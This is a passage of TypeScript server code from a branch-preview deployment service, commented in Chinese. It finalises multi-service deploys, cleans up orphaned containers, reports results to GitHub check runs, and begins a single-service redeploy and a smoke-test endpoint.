            const elapsed = Date.now() - serviceStartTime;
            logEvent({
              step: `build-${profile.id}`,
              status: 'error',
              title: `${profile.name} 失败`,
              log: (err as Error).message,
              detail: { elapsedMs: elapsed },
              timestamp: new Date().toISOString(),
            });
          } finally {
            // 释放构建槽位（幂等），唤醒下一个排队的构建。
            clearQueueTimer();
            buildSlot.release();
          }
        }));

        const layerElapsed = Date.now() - layerStartTime;
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'done',
          title: `第 ${layer.layer} 层完成`,
          detail: { elapsedMs: layerElapsed },
          timestamp: new Date().toISOString(),
        });
      }

      // ── Update overall status ──
      assertBranchOperationCurrent(branchOperationLease, 'before-deploy-finalize');
      //
      // 2026-04-27 (用户反馈"GitHub Checks 一直失败但日志看不到原因"):
      //
      // 历史 bug: hasError 之前是 `Object.values(entry.services).some(s.status==='error')`，
      // 这意味着 entry.services 里**任何**残留的 zombie service（比如旧
      // buildProfile 已删但 entry.services 里它的 entry 还在 status='error'）
      // 都会把 hasError 拉成 true，导致 opLog.status='error' + GitHub
      // check-run conclusion='failure'，但 events 里完全没有这个服务的
      // 痕迹（因为本次 deploy 根本没动它）。
      //
      // 修复: 只考虑本次 deploy 实际参与的 services（profileId 在 profiles
      // 列表里）。zombie service 单独 logEvent('zombie-service', 'warning')
      // 让运营能立即从事件流里发现孤儿条目并手动清理。
      const activeProfileIds = new Set(profiles.map((p) => p.id));
      const activeServices = Object.entries(entry.services).filter(([sid]) =>
        activeProfileIds.has(sid),
      );
      const zombieServices = Object.entries(entry.services).filter(
        ([sid]) => !activeProfileIds.has(sid),
      );
      // 服务已从「期望清单」移除(分支额外服务被清掉 / 项目 profile 被删) → **拆掉它的容器并删条目**,
      // 让「移除即下掉」成立(分支级额外服务的对称半:加能起、删能下)。此前只对 error 态打 warning、
      // 容器残留(2026-06-29 实测:清掉额外服务后 demo-extra 容器仍在跑)。best-effort:remove 失败也
      // 继续删条目,避免卡住整次部署;profiles 非空已由上方 400 守卫保证,不会误删全部。
      if (zombieServices.length > 0) {
        const zActor = resolveActorFromRequest(req);
        const zTrigger = triggerFromRequest(req);
        for (const [sid, svc] of zombieServices) {
          // 操作租约安全（Bugbot Medium / learned rule）：remove 是 await 悬挂点，期间本次 deploy 的
          // 租约可能被更高优先级操作（手动停/删/更新部署）取代。必须在「下掉容器」前后各 assertCurrent
          // 一次，租约被取代时抛 BranchOperationSupersededError 跳出循环 —— 不在已取消的 deploy 下继续
          // delete entry.services + save()。assert 放在下面 best-effort remove 的 try 之外，确保取代错误
          // 不被「容忍 remove 失败」的 catch 吞掉，而是向上冒泡终结本次 finalize（与 4505/4518 同款）。
          assertBranchOperationCurrent(branchOperationLease, `remove-orphan-service before ${sid}`);
          logEvent({
            step: 'remove-orphan-service',
            status: 'running',
            title: `服务 "${sid}" 已从期望清单移除，正在下掉容器…`,
            detail: { profileId: sid, status: svc.status, container: svc.containerName },
            timestamp: new Date().toISOString(),
          });
          try {
            await containerService.remove(svc.containerName, {
              projectId: entry.projectId,
              branchId: entry.id,
              profileId: sid,
              requestId: requestId || null,
              operationId: branchOperationLease?.operationId || null,
              actor: zActor,
              trigger: zTrigger,
              operation: 'deploy-remove-orphan-service',
              source: 'api.deploy-branch',
              reason: '服务已从期望清单移除(额外服务被清/项目 profile 被删)',
            });
          } catch (err) {
            logEvent({ step: 'remove-orphan-service', status: 'warning', title: `服务 "${sid}" 容器移除失败(忽略,仍清条目): ${(err as Error).message}`, timestamp: new Date().toISOString() });
          }
          // remove 的 await 之后、改 state 之前再校验一次：租约还在才删条目。
          assertBranchOperationCurrent(branchOperationLease, `remove-orphan-service after ${sid}`);
          delete entry.services[sid];
          logEvent({ step: 'remove-orphan-service', status: 'done', title: `服务 "${sid}" 已下掉`, timestamp: new Date().toISOString() });
        }
        stateService.save();
      }
      const activeStatuses = activeServices.map(([, s]) => s.status);
      const hasRunning = activeStatuses.some((s) => s === 'running');
      const hasStarting = activeStatuses.some((s) => s === 'starting');
      let hasError = activeStatuses.some((s) => s === 'error');
      const noServiceStarted = profiles.length > 0 && !hasRunning && !hasStarting && !hasError;
      const failedNames = activeServices
        .filter(([, s]) => s.status === 'error')
        .map(([, s]) => s.profileId);
      const failedReasons = activeServices
        .filter(([, s]) => s.status === 'error')
        .map(([sid, svc]) => `${sid}: ${svc.errorMessage || '启动失败'}`);
      if (noServiceStarted) {
        hasError = true;
        const idleServices = activeServices.map(([sid, svc]) => `${sid}:${svc.status}`).join(', ') || '(none)';
        entry.errorMessage = `部署没有启动任何服务（profiles=${profiles.length}, services=${idleServices}）。请查看事件日志确认启动计划是否为空或构建配置是否被跳过。`;
        logEvent({
          step: 'deploy-summary',
          status: 'error',
          title: '部署失败: 没有服务进入运行流程',
          log: entry.errorMessage,
          detail: { profileCount: profiles.length, activeServices: idleServices },
          timestamp: new Date().toISOString(),
        });
      } else if (hasError) {
        const reason = failedReasons.join('\n');
        entry.errorMessage = reason || `失败服务: ${failedNames.join(', ')}`;
        logEvent({
          step: 'deploy-summary',
          status: 'error',
          title: `部署失败: ${failedNames.join(', ') || '未知服务'}`,
          log: reason,
          detail: { failedServices: failedNames },
          timestamp: new Date().toISOString(),
        });
      } else {
        entry.errorMessage = undefined;
      }
      const __statusPrev = entry.status;
      // 空期望清单（额外服务/项目 profile 全清后孤儿剪枝把 entry.services 删空）落 idle，不落 error
      // （Bugbot「Empty deploy marks branch error」）：当分支挂了在线 executor 时上面的本地 empty-cleanup
      // 早返回被 remoteOwned 跳过，可 executor 离线 → 分发回退到本地路径，走到这里。activeStatuses 为空且
      // 非 error 即「成功清空」，与 executor 端 + 本地 empty-cleanup 的 idle 口径对齐；profiles>0 却零服务
      // 的真失败已在上面 noServiceStarted 置 hasError=true，不会落到这个 idle 分支。
      entry.status = hasError ? 'error'
        : hasRunning ? 'running'
        : hasStarting ? 'starting'
        : activeStatuses.length === 0 ? 'idle'
        : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = hasError ? 'error' : 'completed';
      opLog.finishedAt = new Date().toISOString();
      if (!hasError && hasRunning) {
        const runtimeReadyAt = new Date().toISOString();
        entry.lastReadyAt = runtimeReadyAt;
        opLog.runtimeStartedAt = runtimeReadyAt;
        logEvent({
          step: 'runtime-ready',
          status: 'done',
          title: '运行时已通过就绪探测',
          detail: { profileIds: Array.from(activeProfileIds) },
          timestamp: runtimeReadyAt,
        });
      }
      opLog.containerLogSnapshots = await captureContainerLogSnapshots(
        entry,
        hasError ? 'deploy-error' : 'deploy-finalize',
        activeProfileIds,
      );
      // 2026-06-27：回填本次部署「实际跑起来」的部署模式，供构建历史展示「部署类型」。
      // 优先取参与服务的 svc.deployedMode（runService 在容器起来后权威钉过，含极速版镜像
      // 拉不到→源码构建的回退真相）；否则镜像回退场景会把源码部署误标成极速版（Codex P2）。
      // 取不到 deployedMode（如未起容器）再退回配置的 activeDeployMode。空串=源码/默认模式。
      const ranDeployModes = Array.from(activeProfileIds)
        .map((pid) => (entry.services?.[pid] as { deployedMode?: string } | undefined)?.deployedMode)
        .filter((m): m is string => typeof m === 'string' && m.trim() !== '')
        .map((m) => ({ activeDeployMode: m }));
      opLog.deployMode = deriveDeployMode(
        ranDeployModes.length > 0
          ? ranDeployModes
          : profiles.filter((p) => activeProfileIds.has(p.id)).map((p) => resolveEffectiveProfile(p, entry)),
      );
      // 2026-06-20：成功部署记一条耗时样本（区分发布版/源码），供分支卡片
      // 在下次构建中展示"预计 MM:SS（近 N 次中位值）"。失败不记。
      recordDeployDurationSample(stateService, entry, profiles, opLog);
      stateService.appendLog(id, opLog);
      stateService.save();

      // Live UI: final status transition so the branch card stops
      // spinning (running/error/starting). Same envelope shape as the
      // 'building' emit earlier so the client can render transitions
      // with one branch.
      branchEvents.emitEvent({
        type: 'branch.status',
        payload: {
          branchId: id, projectId: entry.projectId,
          status: entry.status, previousStatus: __statusPrev, ts: nowIso(),
        },
      });

      // 2026-04-27 (Bugbot review): failedNames 必须用 activeServices 过滤，
      // 不然 zombie service（旧 buildProfile 已删但 entry.services 残留 status='error'）
      // 会和真实失败服务一起出现在 completeMsg / activity log note 里，
      // 误导运营。zombie 已经在上面 logEvent('zombie-service') 单独可见。
      const completeMsg = hasError
        ? (noServiceStarted ? '部署失败: 没有服务进入运行流程' : `部分服务启动失败: ${failedNames.join(', ')}`)
        : '所有服务已启动';
      logDeploy(id, `部署完成: ${completeMsg}`);
      // PR_C.3: 部署计数 + 时间戳 + activity log（成功/失败分别记）
      stateService.incrementBranchStat(id, 'deployCount');
      if (!hasError) stateService.stampBranchTimestamp(id, 'lastDeployAt');
      stateService.appendActivityLog(entry.projectId, {
        type: hasError ? 'deploy-failed' : 'deploy',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
        note: hasError ? `失败服务: ${failedNames.join(', ')}` : undefined,
      });
      stateService.save();
      sendSSE(res, 'complete', {
        // 2026-05-14 Codex review P2：把路由自己基于 activeServices 算出的
        // 权威结论 (hasError) 一并下发。消费方（auto-lifecycle redeploy）
        // 直接读 ok，不要再用全量 entry.services 重新推导——否则已删除/
        // 僵尸 profile 的 stopped/error 服务会被误判成部署失败。
        ok: !hasError,
        message: completeMsg,
        services: entry.services,
      });

      // Phase 4: auto-smoke after a green deploy (best-effort; never
      // blocks the deploy conclusion, never throws out of the handler).
      // 2026-04-27: 单独 try/catch 让 smoke 的异常落到 opLog.events 里
      // 而不是被外层 catch 吞掉只剩 entry.errorMessage（GitHub Checks 看
      // 到 "Deploy failed" 但 /api/branches/:id/logs 全是 done 的根因）。
      let smokeResult: Awaited<ReturnType<typeof maybeRunAutoSmoke>> = null;
      try {
        smokeResult = await maybeRunAutoSmoke(res, entry, hasError);
      } catch (err) {
        const msg = (err as Error)?.message || String(err);
        const stack = (err as Error)?.stack || '';
        logEvent({
          step: 'auto-smoke',
          status: 'error',
          title: `自动冒烟阶段抛出: ${msg.slice(0, 120)}`,
          log: stack ? `${msg}\n${stack}` : msg,
          timestamp: new Date().toISOString(),
        });
      }

      // Finalize the GitHub check run (best-effort). `hasError` decides
      // success vs failure; the preview URL surfaces in the check-run
      // summary so GitHub's "Details" button jumps straight to preview.
      // logTail = last 80 events rendered as "[status] step: title"
      // lines, surfaced under "Show more" in GitHub's Checks panel.
      //
      // Phase 5: if auto-smoke ran, fold its result into the check-run
      // conclusion so the PR Checks panel shows "CDS Deploy" red when
      // deploy is green but smoke tripped (most useful signal for PR
      // reviewers — "deployed fine but API is broken").
      const smokeOk = smokeResult
        ? smokeResult.exitCode === 0 && smokeResult.failedCount === 0
        : true;
      const finalConclusion = hasError || !smokeOk ? 'failure' : 'success';
      const summary = smokeResult
        ? `${completeMsg} | 冒烟 ${smokeOk ? '通过' : '失败'} pass=${smokeResult.passedCount} fail=${smokeResult.failedCount} (${smokeResult.elapsedSec}s)`
        : completeMsg;
      // 2026-04-27: 同上，把 finalize 的 throw 落到 opLog.events 里。
      try {
        const failureDetail = finalConclusion === 'failure'
          ? await buildCheckRunFailurePostmortem(entry, containerService, activeProfileIds)
          : undefined;
        await checkRunRunner.finalize(entry, {
          conclusion: finalConclusion,
          summary,
          previewUrl: checkRunRunner.derivePreviewUrl(entry),
          failureDetail,
          logTail: opLog.events.slice(-80).map((ev) => {
            const st = ev.status || '?';
            const ttl = ev.title || ev.step;
            return `[${st}] ${ev.step}: ${ttl}`;
          }).join('\n'),
        });
      } catch (err) {
        const msg = (err as Error)?.message || String(err);
        const stack = (err as Error)?.stack || '';
        logEvent({
          step: 'check-run-finalize',
          status: 'error',
          title: `回写 GitHub check run 失败: ${msg.slice(0, 120)}`,
          log: stack ? `${msg}\n${stack}` : msg,
          detail: { conclusion: finalConclusion },
          timestamp: new Date().toISOString(),
        });
      }
    } catch (err) {
      // 2026-04-27 (用户明确反馈"日志看不到原因"): 这里以前只把错误塞进
      // entry.errorMessage + sendSSE，opLog.events 里没有任何 error 事件，
      // 导致 GET /api/branches/:id/logs 显示全部 done 但 entry.status=error
      // GitHub Checks 也只看到 "Deploy failed" 没有阶段信息。
      // 现在统一通过 logEvent() 写入事件，让事后排查能在事件流中看到。
      const errMsg = (err as Error)?.message || String(err);
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      const errStack = (err as Error)?.stack || '';
      if (err instanceof BranchOperationSupersededError) {
        await cleanupFencedDeployContainers(
          entry,
          new Set(profiles.map((profile) => profile.id)),
          requestId,
          `部署操作被更高优先级操作取代: ${errMsg}`,
          branchOperationLease?.operationId || null,
          branchOperationLease?.startedAt || null,
        );
        logEvent({
          step: 'deploy-fenced',
          status: 'warning',
          title: '部署操作已被更高优先级操作取代，停止写入分支状态',
          log: errMsg,
          timestamp: new Date().toISOString(),
        });
        opLog.status = 'error';
        opLog.finishedAt = new Date().toISOString();
        stateService.appendLog(id, opLog);
        stateService.save();
        sendSSE(res, 'error', { message: errMsg, operationStatus: 'cancelled' });
        return;
      }
      logEvent({
        step: 'deploy',
        status: 'error',
        title: `部署整体失败: ${errMsg.slice(0, 200)}`,
        log: errStack ? `${errMsg}\n${errStack}` : errMsg,
        timestamp: new Date().toISOString(),
      });
      entry.status = 'error';
      entry.errorMessage = errMsg;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      opLog.containerLogSnapshots = await captureContainerLogSnapshots(entry, 'deploy-error');
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${errMsg}`);
      // 2026-06-21 Bug A 修复：向 /branches/stream 订阅者广播状态翻转到 error，
      // 让分支卡片立即停止"构建中"转圈并切到失败态，无需手动刷新页面。
      // 与成功 finalize 路径（branch.status: running/error）同口径。
      branchEvents.emitEvent({
        type: 'branch.status',
        payload: {
          branchId: id, projectId: entry.projectId,
          status: entry.status, previousStatus: __deployEntryStatus, ts: nowIso(),
        },
      });
      sendSSE(res, 'error', { message: errMsg });
      try {
        // catch 路径同样按本次 startup-plan 过滤 zombie 服务(profiles 在外层 4724
        // 声明,异常路径仍可见),与成功/失败 finalize 同口径,不让旧 profile 背锅。
        const failureDetail = await buildCheckRunFailurePostmortem(
          entry, containerService, new Set(profiles.map((p) => p.id)),
        );
        await checkRunRunner.finalize(entry, {
          conclusion: 'failure',
          summary: errMsg || '部署失败',
          previewUrl: checkRunRunner.derivePreviewUrl(entry),
          failureDetail,
          logTail: opLog.events.slice(-80).map((ev) => {
            const st = ev.status || '?';
            const ttl = ev.title || ev.step;
            return `[${st}] ${ev.step}: ${ttl}`;
          }).join('\n'),
        });
      } catch (finalizeErr) {
        // 兜底：即使 finalize 二次失败，也别让 throw 冒泡破坏 finally
        const m = (finalizeErr as Error)?.message || String(finalizeErr);
        logEvent({
          step: 'check-run-finalize',
          status: 'error',
          title: `失败兜底回写 GitHub check 也失败: ${m.slice(0, 120)}`,
          log: m,
          timestamp: new Date().toISOString(),
        });
      }
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      res.end();
    }
  });

  // ── Redeploy a single service (SSE stream) ──

  router.post('/branches/:id/deploy/:profileId', async (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    if (!isAllowedCdsBranchName(entry.branch)) {
      res.status(400).json({
        error: 'invalid_branch_name',
        message: `拒绝部署非法分支名: ${entry.branch}`,
      });
      return;
    }

    // P4 Part 17 (G2 fix): scope by the branch's project so a
    // single-service redeploy can't accidentally pick up a same-named
    // profile from a different project.
    const profiles = stateService.getEffectiveProfilesForBranch(entry);
    const profile = profiles.find(p => p.id === profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }

    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'deploy-profile',
      profileId,
      commitSha: entry.githubCommitSha || null,
      source: 'api.deploy-profile',
      reason: triggerFromRequest(req) === 'webhook' ? 'GitHub webhook single profile deploy' : 'manual single profile deploy',
      sse: true,
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
      // 2026-06-27 构建历史元数据：单服务部署。触发器 + commit + 该 profile 的部署模式。
      triggerSource: classifyTriggerSource(triggerFromRequest(req), entry.deployDispatchRetryCount),
      ...deriveCommitMeta(entry),
      deployMode: deriveDeployMode([resolveEffectiveProfile(profile, entry)]),
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    try {
      logDeploy(id, `开始部署服务 ${profile.name}`);

      // Clear previous error state on new deploy
      assertBranchOperationCurrent(branchOperationLease, 'before-profile-deploy-state');
      entry.errorMessage = undefined;
      const existingSvc = entry.services[profile.id];
      if (existingSvc?.errorMessage) existingSvc.errorMessage = undefined;
      // 本轮（单服务）构建起点锚点 —— 与多服务/远端执行器路径一致，供预览等待页
      // ETA 计"已等待"，避免回退到上一轮历史 op-log 误算（见 BranchEntry.lastDeployStartedAt）。
      entry.lastDeployStartedAt = new Date().toISOString();
      stateService.save();

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      const deployProject = entry.projectId ? stateService.getProject(entry.projectId) : undefined;
      const pullResult = isSyntheticCdsManagedRuntimeBranch(entry, deployProject)
        ? { head: entry.githubCommitSha || 'cds-managed-runtime', skipped: true, reason: 'synthetic-cds-managed-runtime' }
        : await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // 同主 deploy 路径:**非极速版**才用 pull 后真实 HEAD 刷新 githubCommitSha;极速版
      // 镜像锁定 CI 就绪的 ciTargetSha,不跟随 pull 后新 HEAD（Codex P2: refresh prebuilt
      // SHA after pulling latest code + require CI readiness for the deployed SHA）。
      // 本单服务路径无 requestCommitSha 变量,内联判定 body.commitSha 是否显式指定;
      // 用本 profile 的 prebuiltImage 判定是否极速版。
      {
        const bodySha = typeof req.body?.commitSha === 'string' && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
          ? req.body.commitSha : undefined;
        const isPrebuiltProfile = resolveEffectiveProfile(profile, entry).prebuiltImage === true;
        // 同主路径：head 带标题非裸 SHA，用 parsePulledSha 取裸 SHA（优先 after）再比对刷新（Codex P2）。
        const pulledSha = parsePulledSha(pullResult);
        const isSourcePull = !isPrebuiltProfile && !(pullResult as { skipped?: boolean }).skipped && !!pulledSha;
        if (!bodySha && isSourcePull && shouldRefreshCommitSha(entry.githubCommitSha, pulledSha)) {
          entry.githubCommitSha = pulledSha;
        }
        // opLog.commitSha 记**实际部署**的 SHA = pulledSha，不受 body.commitSha 影响：deploy 总是
        // reset 到分支 HEAD（下方清 pinnedCommit），冻结在请求 SHA 会指错版本（Codex P2「Do not
        // freeze webhook history on the requested SHA」）。极速版/skip 除外。
        if (isSourcePull) {
          Object.assign(opLog, deriveCommitMeta(entry, pulledSha));
        }
      }

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
        stateService.save();
      }

      // Resolve baseline → branch override → deploy-mode override
      const effectiveProfile = resolveEffectiveProfile(profile, entry);
      const branchOverride = entry.profileOverrides?.[profile.id];
      const activeMode = effectiveProfile.activeDeployMode;
      const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
        ? ` [${effectiveProfile.deployModes[activeMode].label}]`
        : '';
      const overrideLabel = branchOverride ? ' (分支自定义)' : '';

      // Build & run the single profile
      logEvent({ step: `build-${profile.id}`, status: 'running', title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`, timestamp: new Date().toISOString() });

      if (!entry.services[profile.id]) {
        const hostPort = stateService.allocatePort(config.portStart, await collectListeningPorts(shell));
        entry.services[profile.id] = {
          profileId: profile.id,
          containerName: `cds-${id}-${profile.id}`,
          hostPort,
          status: 'building',
        };
        stateService.save();
      }

      const svc = entry.services[profile.id];
      svc.status = 'building';

      try {
        const mergedEnv = getMergedEnv(entry.projectId, entry.id);
        await archiveBranchContainerLogs({
          stateService,
          containerService,
          branch: entry,
          source: 'pre-deploy-recreate',
          profileIds: new Set([profile.id]),
          serverEventLogStore,
          message: 'captured before docker rm/run during single service deploy',
          requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
          operationId: branchOperationLease?.operationId || null,
          actor: resolveActorFromRequest(req),
          trigger: triggerFromRequest(req),
        });
        await runServiceWithPortRetry({
          stateService,
          shell,
          config,
          containerService,
          serverEventLogStore,
          entry,
          profile: effectiveProfile,
          service: svc,
          customEnv: mergedEnv,
          requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
          operationId: branchOperationLease?.operationId || null,
          actor: resolveActorFromRequest(req),
          trigger: triggerFromRequest(req),
          assertCurrent: (step) => assertBranchOperationCurrent(branchOperationLease, step),
          onPortChanged: ({ oldPort, newPort, attempt }) => {
            logEvent({
              step: `port-${profile.id}`,
              status: 'warning',
              title: `${effectiveProfile.name} 端口 ${oldPort} 已占用，改用 :${newPort} 重试`,
              detail: { oldPort, newPort, attempt },
              timestamp: new Date().toISOString(),
            });
          },
          onOutput: (chunk) => {
            sendSSE(res, 'log', { profileId: profile.id, chunk });
            for (const line of chunk.split('\n')) {
              if (line.trim()) logDeploy(id, line);
            }
          },
        });

        assertBranchOperationCurrent(branchOperationLease, `after-run-${profile.id}`);
        // Enter 'starting' and gate transition on startup signal + readiness
        // probe (TCP+HTTP). Prevents the 502 window between `docker run` exit
        // and the app binding its port. See .claude/rules/cds-auto-deploy.md.
        svc.status = 'starting';
        stateService.save();
        logEvent({ step: `build-${profile.id}`, status: 'done', title: `${profile.name} 容器已启动，等待就绪 :${svc.hostPort}`, timestamp: new Date().toISOString() });

        let ready = false;
        if (profile.startupSignal) {
          const signalReady = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
            for (const line of chunk.split('\n')) {
              if (line.trim()) logDeploy(id, line);
            }
          });
          ready = signalReady;
        }
        if (!profile.startupSignal || ready) {
          ready = await containerService.waitForReadiness(
            svc.hostPort,
            // 发布阶段就绪探测：抬到部署下限(默认 1200s)，避免慢首启被误杀。运行期重启/唤醒不走这里。
            applyDeployReadinessFloor(
              profile.readinessProbe,
              resolveDeployReadinessFloorSeconds(
                stateService.getState().deployReadinessFloorSeconds,
                stateService.getProject(entry.projectId || 'default')?.deployReadinessFloorSeconds,
              ),
            ),
            (info) => {
              sendSSE(res, 'probe', { profileId: profile.id, attempt: info.attempt, max: info.max, stage: info.stage, ok: info.ok, error: info.error });
            },
            (chunk) => {
              for (const line of chunk.split('\n')) {
                if (line.trim()) logDeploy(id, line);
              }
            },
          );
        }
        if (ready) {
          svc.status = 'running';
          svc.errorMessage = undefined;
          // 2026-05-14 真实态徽章：单服务 redeploy 同样钉住实际 deploy mode。
          // 2026-06-24（Bugbot/Codex P2）：runService 已权威钉过 svc.deployedMode（含极速版→
          // 源码自动回退后的真实模式），优先采纳它；仅其未设时退回 effectiveProfile（极速版会是
          // express，回退场景下不准，会让 widget/收敛逻辑误以为仍在用 CI 镜像）。
          svc.deployedMode = svc.deployedMode || effectiveProfile.activeDeployMode || '';
          logDeploy(id, `${profile.name} 启动成功 OK`);
        } else {
          svc.status = 'error';
          svc.errorMessage = await buildReadinessTimeoutMessage(containerService, svc.containerName);
          logDeploy(id, `${profile.name} 就绪探测超时`);
        }
        stateService.save();
      } catch (err) {
        if (err instanceof BranchOperationSupersededError) throw err;
        svc.status = 'error';
        svc.errorMessage = (err as Error).message;
        logEvent({ step: `build-${profile.id}`, status: 'error', title: `${profile.name} 失败`, log: (err as Error).message, timestamp: new Date().toISOString() });
      }

      // Update overall status
      assertBranchOperationCurrent(branchOperationLease, 'before-profile-deploy-finalize');
      const statuses = Object.values(entry.services).map(s => s.status);
      const hasRunning = statuses.some(s => s === 'running');
      const hasStarting = statuses.some(s => s === 'starting');
      entry.status = hasRunning ? 'running' : hasStarting ? 'starting' : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = svc.status === 'running' ? 'completed' : 'error';
      opLog.finishedAt = new Date().toISOString();
      // 单服务路径：用 svc 实际跑起来的 deployedMode 重算部署类型（含极速版→源码回退真相），
      // 而非创建时（11036）按配置 activeDeployMode 取的值（Codex P2，与主/远端路径一致）。
      // deployedMode 缺失/空（如未起容器/源码默认）时，与主路径一致退回 resolveEffectiveProfile，
      // 绝不保留 pull 前的配置态（Bugbot Low「Single-service deploy mode gap」）。
      {
        const ranMode = (svc as { deployedMode?: string }).deployedMode;
        opLog.deployMode = (typeof ranMode === 'string' && ranMode.trim() !== '')
          ? ranMode.trim()
          : deriveDeployMode([resolveEffectiveProfile(profile, entry)]);
      }
      if (svc.status === 'running') {
        const runtimeReadyAt = new Date().toISOString();
        entry.lastReadyAt = runtimeReadyAt;
        opLog.runtimeStartedAt = runtimeReadyAt;
        logEvent({
          step: 'runtime-ready',
          status: 'done',
          title: `${profile.name} 已通过就绪探测`,
          detail: { profileIds: [profile.id] },
          timestamp: runtimeReadyAt,
        });
      }
      opLog.containerLogSnapshots = await captureContainerLogSnapshots(
        entry,
        svc.status === 'running' ? 'deploy-finalize' : 'deploy-error',
        new Set([profile.id]),
      );
      // 2026-06-20：单 profile 部署成功也记一条耗时样本（仅基于本次部署的
      // profile 判定发布版/源码），与多服务路径同一台账。失败不记。
      recordDeployDurationSample(stateService, entry, [profile], opLog);
      stateService.appendLog(id, opLog);
      stateService.save();

      const completeMsg = svc.status === 'running' ? `${profile.name} 已启动` : `${profile.name} 启动失败`;
      logDeploy(id, `部署完成: ${completeMsg}`);
      sendSSE(res, 'complete', {
        // 2026-05-14 Codex review P2：单服务 redeploy 也下发权威 ok，
        // 消费方统一读 ok 而非重推导 entry.services。
        ok: svc.status === 'running',
        message: completeMsg,
        services: entry.services,
      });
    } catch (err) {
      branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
      if (err instanceof BranchOperationSupersededError) {
        const errMsg = (err as Error).message;
        await cleanupFencedDeployContainers(
          entry,
          new Set([profile.id]),
          String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined,
          `单服务部署被更高优先级操作取代: ${errMsg}`,
          branchOperationLease?.operationId || null,
          branchOperationLease?.startedAt || null,
        );
        logEvent({
          step: 'deploy-fenced',
          status: 'warning',
          title: '单服务部署已被更高优先级操作取代，停止写入分支状态',
          log: errMsg,
          timestamp: new Date().toISOString(),
        });
        opLog.status = 'error';
        opLog.finishedAt = new Date().toISOString();
        stateService.appendLog(id, opLog);
        stateService.save();
        sendSSE(res, 'error', { message: errMsg, operationStatus: 'cancelled' });
        return;
      }
      entry.status = 'error';
      entry.errorMessage = (err as Error).message;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      opLog.containerLogSnapshots = await captureContainerLogSnapshots(entry, 'deploy-error', new Set([profile.id]));
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      res.end();
    }
  });

  // ── Smoke test a branch's preview URL ──
  //
  // Phase 3 交付: 部署绿灯后,操作员点「冒烟测试」按钮触发这个端点,
  // CDS 以当前分支预览域名作为 SMOKE_TEST_HOST 运行 scripts/smoke-all.sh,
  // 并把 bash 子进程的 stdout/stderr 逐行以 SSE `line` 事件推给前端,
  // 最后 `complete` 事件带上退出码 + 耗时。
  //
  // AI_ACCESS_KEY 从 request body 或 project-scoped customEnv 里取,
  // CDS 自身的 state.json 不落库 plaintext(operator 每次触发都要粘,
  // 或一次性写进项目 env 的 _global 作用域即可)。
  //
  // 设计约束 (对齐 .claude/rules/server-authority.md):
  //   - 使用 CancellationToken.None 等价语义: 客户端断 SSE 不杀 bash
  //   - 10 秒 keepalive 心跳防 proxy 超时
  //   - stdout/stderr 合并推送(smoke-*.sh 的 FAIL 都在 stderr)
  //
  // SMOKE_SCRIPT_DIR 默认为 `<process.cwd()>/scripts` (CDS 进程启动目录的
  // scripts 子目录),可通过 env `CDS_SMOKE_SCRIPT_DIR` 覆盖 —— 方便容器化
  // 部署时把脚本挂到固定路径。
  router.post('/branches/:id/smoke', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // Resolve preview URL. Without one the smoke has no target, so we
    // refuse up-front with a clear message instead of letting bash try
    // to hit an empty URL.
    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      res.status(400).json({
        error: 'preview_host_missing',
        message: '未配置 previewDomain / rootDomains,无法推导预览 URL — 请先在 cds.config.json 设置。',
      });
      return;
    }
    // 走 buildPreviewUrlForProject 全栈入口；project 必有，用 'default' 兜底。
    const smokeProject = stateService.getProject(entry.projectId || 'default');
    const smokeHost = buildPreviewUrlForProject(
      previewHost,
      entry.branch,
      smokeProject,
      entry.projectId || 'default',
    ).url;
    if (!smokeHost) {
